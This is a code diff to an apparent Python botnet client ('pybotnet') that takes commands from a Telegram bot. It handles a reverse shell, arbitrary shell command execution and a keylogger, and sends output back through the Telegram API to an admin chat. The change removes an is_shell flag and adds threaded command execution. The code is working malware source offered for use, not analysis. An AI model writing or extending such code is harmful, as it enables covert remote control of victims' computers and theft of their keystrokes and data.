@@ -77,7 +77,7 @@ def is_command(command) -> bool:
     return False
 
 
-def reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger):
+def reverse_shell(ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger):
     ''' start reverse shell on target system and send response in telegram bot '''
 
     def send_message(text: str):
@@ -110,15 +110,14 @@ def reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, l
                 send_message(out_put)
                 break
             else:
-                out_put = execute_cmd(
-                    command=message_one, is_shell=is_shell, logger=logger)
+                out_put = execute_cmd(message_one,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger)
             send_message(out_put)
             repeat = 0
     logger.info("reverse shell exit.")
     return "reverse shell exit."
 
 
-def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_CHAT_ID: str,
+def execute_scripts(command: str, pybotnet_up_time: int,ADMIN_CHAT_ID: str,
                     TELEGRAM_TOKEN: str, previous_update_id: List[int], logger):
     command_name = get_command_name(command)
     try:
@@ -129,7 +128,7 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
                 logger.info('delete mac addres and run command ')
                 new_command = ' '.join(split_command(command)[1:])
                 return execute_scripts(
-                    new_command, pybotnet_up_time, is_shell,
+                    new_command, pybotnet_up_time,
                     ADMIN_CHAT_ID, TELEGRAM_TOKEN,
                     previous_update_id, logger)
 
@@ -140,7 +139,7 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
                 return get_info(pybotnet_up_time, logger)
 
             elif command_name == 'cmd':
-                return execute_cmd(command, is_shell, logger)
+                return execute_cmd(command,ADMIN_CHAT_ID, TELEGRAM_TOKEN,logger,withThread=True)
 
             elif command_name == 'ls':
                 return execute_ls(command, logger)
@@ -161,7 +160,7 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
                 return command_help(logger)
 
             elif command_name in ['reverse_shell']:
-                return reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger)
+                return reverse_shell(ADMIN_CHAT_ID, TELEGRAM_TOKEN,previous_update_id, logger)
 
             elif command_name == "keylogger" and split_command(command)[1] in ['start', 'stop']:
                 return keylogger(logger, command)
@@ -283,8 +282,8 @@ def clean_shell_data(output):
     return output
 
 
-def cmd(command: list, is_shell: bool, logger):
-    '''run code on terminal'''
+def cmd(command,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger,withThread):
+    '''Runs cmd commands.'''
 
     if command[0] == 'ls':
         logger.info('redirect to execute_ls')
@@ -296,22 +295,28 @@ def cmd(command: list, is_shell: bool, logger):
 
     logger.info(f'try to run: {command}')
 
-    if not is_shell or command[0] in ['mkdir', 'touch', 'rm', 'rmdir']:
+    if command[0] in ['mkdir', 'touch', 'rm', 'rmdir']:
         os_result = os.system(' '.join(command))
-        add_on_message = ''
-        if not is_shell:
-            add_on_message = '''\n
-you compile app noconsole (is_shell = False)
-That\'s why I can\'t get the output text by `cmd` command'''
+        add_on_message = '''Done !'''
 
         return f'output code "{os_result}", {add_on_message}'
 
     else:
-        result = subprocess.getoutput(' '.join(command))
-        return clean_shell_data(result)
+        # Everything starts from here.
+        if not withThread:
+            executecode = util.execute_commands(' '.join(command),ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger)
+            result = executecode.runcommand_for_reverse_shell()
+            return clean_shell_data(result)
 
+        else:
+            executecode = util.execute_commands(' '.join(command),ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger)
+            command = threading.Thread(target=executecode.runcommand)
+            command.start()
+            return "Your command is being executed , you will get the results when it is done."
 
-def execute_cmd(command: str, is_shell: bool, logger) -> str:
+def execute_cmd(command: str,ADMIN_CHAT_ID: str, TELEGRAM_TOKEN : str, logger,withThread=False) -> str:
+    #Removed Is Shell
+    # For what is for reverse shell
     try:
         command = split_command(command)
         if command[0] == 'cmd':
@@ -321,7 +326,9 @@ def execute_cmd(command: str, is_shell: bool, logger) -> str:
         return f'execute_cmd invalid command; Wrong format: {error}'
 
     try:
-        return cmd(command, is_shell, logger=logger)
+        return cmd(
+            command,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger=logger,withThread=withThread
+            )
 
     except OverflowError as error:
         return f'cmd {error}'
